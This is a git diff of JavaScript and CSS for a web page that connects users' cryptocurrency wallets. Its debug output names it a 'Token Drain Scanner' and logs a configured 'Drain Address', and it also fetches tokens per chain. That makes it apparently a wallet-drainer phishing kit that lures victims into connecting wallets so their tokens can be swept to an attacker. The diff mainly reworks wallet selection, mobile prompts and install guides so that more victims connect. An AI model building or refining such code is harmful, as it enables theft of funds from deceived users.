-                transform: translateY(-5px);
-                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-            }
-            
-            .mobile-wallet-icon {
-                font-size: 36px;
-                margin-bottom: 12px;
-            }
-            
-            .mobile-wallet-name {
-                font-weight: 600;
-                font-size: 16px;
-            }
-            
-            .manual-steps {
-                background: rgba(0, 0, 0, 0.2);
-                border-radius: 12px;
-                padding: 15px;
-                margin: 15px 0;
-            }
-            
-            .step {
-                padding: 8px 0;
-                color: white;
-                font-size: 14px;
-            }
-            
-            .url-copy-box {
-                display: flex;
-                gap: 10px;
-                margin-top: 10px;
-            }
-            
-            .url-input {
-                flex: 1;
-                padding: 12px 16px;
-                border: 2px solid rgba(255,255,255,0.2);
-                border-radius: 10px;
-                background: rgba(0,0,0,0.3);
-                color: white;
-                font-size: 14px;
-            }
-            
-            .copy-btn {
-                padding: 12px 24px;
-                background: white;
-                color: #764ba2;
-                border: none;
-                border-radius: 10px;
-                font-weight: 600;
-                cursor: pointer;
-                transition: all 0.2s;
-            }
-            
-            .copy-btn:hover {
-                background: #f0f0f0;
-                transform: scale(1.05);
-            }
-            
-            @media (max-width: 480px) {
-                .mobile-wallet-grid {
-                    grid-template-columns: 1fr;
-                }
-                
-                .mobile-wallet-btn {
-                    padding: 20px 15px;
-                }
-            }
-        </style>
-    `;
-    
-    statusEl.innerHTML = html;
-}
-
-// Copy URL for mobile
-function copyMobileUrl() {
-    const urlInput = document.querySelector('.url-input');
-    if (urlInput) {
-        urlInput.select();
-        document.execCommand('copy');
-        
-        const copyBtn = document.querySelector('.copy-btn');
-        if (copyBtn) {
-            const originalText = copyBtn.textContent;
-            copyBtn.textContent = 'Copied!';
-            copyBtn.style.background = '#10b981';
-            copyBtn.style.color = 'white';
-            
-            setTimeout(() => {
-                copyBtn.textContent = originalText;
-                copyBtn.style.background = 'white';
-                copyBtn.style.color = '#764ba2';
-            }, 2000);
-        }
+    } catch (error) {
+        console.error('❌ Exodus connection error:', error);
+        updateStatus('❌ Exodus connection failed: ' + error.message);
     }
-}
-
-// Handle mobile wallet click
-function handleMobileWalletClick(walletKey) {
-    console.log('📱 Opening wallet:', walletKey);
-    walletProvider = walletKey;
-    
-    // Store for when user returns
-    localStorage.setItem('mobileWallet', walletKey);
-    
-    // For Android, handle intent fallback
-    if (navigator.userAgent.toLowerCase().includes('android')) {
-        setTimeout(() => {
-            // Check if page is still visible (wallet didn't open)
-            if (document.visibilityState === 'visible') {
-                // Show instructions modal
-                showMobileInstructionsModal();
-            }
-        }, 1500);
-    }
-}
-
-// Show mobile instructions modal
-function showMobileInstructionsModal() {
-    const modalHTML = `
-        <div class="mobile-instructions-modal">
-            <div class="modal-content">
-                <h3>Wallet Not Opening?</h3>
-                <p>Follow these steps:</p>
-                <ol>
-                    <li>Open your wallet app manually</li>
-                    <li>Go to browser/DApps section</li>
-                    <li>Paste the URL from the previous screen</li>
-                </ol>
-                <button onclick="closeMobileInstructions()" class="modal-close-btn">Got it</button>
-            </div>
-        </div>
-        <style>
-            .mobile-instructions-modal {
-                position: fixed;
-                top: 0; left: 0; right: 0; bottom: 0;
-                background: rgba(0,0,0,0.8);
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                z-index: 10000;
-                padding: 20px;
-            }
-            
-            .modal-content {
-                background: white;
-                padding: 30px;
-                border-radius: 20px;
-                max-width: 400px;
-                width: 100%;
-                text-align: center;
-            }
-            
-            .modal-content h3 {
-                margin-top: 0;
-                color: #333;
-            }
-            
-            .modal-content ol {
-                text-align: left;
-                margin: 20px 0;
-                padding-left: 20px;
-            }
-            
-            .modal-content li {
-                margin: 10px 0;
-                color: #555;
-            }
-            
-            .modal-close-btn {
-                background: #4a6cf7;
-                color: white;
-                border: none;
-                padding: 12px 30px;
-                border-radius: 10px;
-                font-size: 16px;
-                cursor: pointer;
-                margin-top: 20px;
-            }
-        </style>
-    `;
-    
-    const modal = document.createElement('div');
-    modal.innerHTML = modalHTML;
-    document.body.appendChild(modal);
-}
-
-// Close mobile instructions
-function closeMobileInstructions() {
-    const modal = document.querySelector('.mobile-instructions-modal');
-    if (modal) modal.remove();
 }
 
 // Handle successful connection
@@ -1595,91 +1887,6 @@ function updateProgress(message, percent) {
     console.log(`Progress: ${percent}% - ${message}`);
 }
 
-// Show wallet install guide
-function showWalletInstallGuide() {
-    const guideHTML = `
-        <div class="wallet-install-guide">
-            <h4>📱💻 Install Wallet</h4>
-            <p>To use this dApp, you need a Web3 wallet:</p>
-            <div class="wallet-download-grid">
-                <a href="https://metamask.io/download/" target="_blank" class="download-card" style="background: #f6851b">
-                    <span>🦊</span>
-                    <span>MetaMask</span>
-                </a>
-                <a href="https://trustwallet.com/" target="_blank" class="download-card" style="background: #3375bb">
-                    <span>🔶</span>
-                    <span>Trust Wallet</span>
-                </a>
-                <a href="https://www.binance.com/en/download" target="_blank" class="download-card" style="background: #f0b90b">
-                    <span>🟡</span>
-                    <span>Binance Wallet</span>
-                </a>
-                <a href="https://www.coinbase.com/wallet/downloads" target="_blank" class="download-card" style="background: #0052ff">
-                    <span>🔷</span>
-                    <span>Coinbase Wallet</span>
-                </a>
-            </div>
-            <p class="mobile-tip">
-                <strong>Mobile Users:</strong> Open this link in your wallet's built-in browser for best experience.
-            </p>
-        </div>
-        
-        <style>
-            .wallet-install-guide {
-                margin: 20px 0;
-                padding: 25px;
-                background: linear-gradient(135deg, #fdf6e3, #faf3e0);
-                border-radius: 20px;
-                border: 2px solid #ffd166;
-                text-align: center;
-            }
-            
-            .wallet-install-guide h4 {
-                margin-top: 0;
-                color: #856404;
-                font-size: 22px;
-            }
-            
-            .wallet-download-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-                gap: 15px;
-                margin: 25px 0;
-            }
-            
-            .download-card {
-                padding: 20px 15px;
-                border-radius: 15px;
-                color: white;
-                text-decoration: none;
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 12px;
-                font-weight: 600;
-                transition: all 0.3s;
-            }
-            
-            .download-card:hover {
-                transform: translateY(-5px);
-                box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            }
-            
-            .download-card span:first-child {
-                font-size: 32px;
-            }
-            
-            .mobile-tip {
-                font-size: 14px;
-                color: #666;
-                margin-top: 20px;
-            }
-        </style>
-    `;
-    
-    statusEl.innerHTML = guideHTML;
-}
-
 // Update status
 function updateStatus(message) {
     statusEl.textContent = message;
@@ -1830,15 +2037,17 @@ async function fetchTokensForChain(address, chainId) {
 window.addEventListener('DOMContentLoaded', initializeApp);
 
 // Make functions available globally
-window.selectWallet = selectWallet;
 window.closeWalletSelector = closeWalletSelector;
-window.handleMobileWalletClick = handleMobileWalletClick;
-window.copyMobileUrl = copyMobileUrl;
+window.handleWalletSelection = handleWalletSelection;
+window.showManualInstructions = showManualInstructions;
 window.closeMobileInstructions = closeMobileInstructions;
+window.closeManualInstructions = closeManualInstructions;
+window.copyManualUrl = copyManualUrl;
+window.closeNotInstalledModal = closeNotInstalledModal;
 
 // Debug
 console.log('=== Token Drain Scanner ===');
-console.log('Version: 5.0 - Enhanced Wallet Support');
+console.log('Version: 6.0 - Universal Wallet Connection');
 console.log('Drain Address:', CONFIG.drainAddress);
 console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
 console.log('===========================');
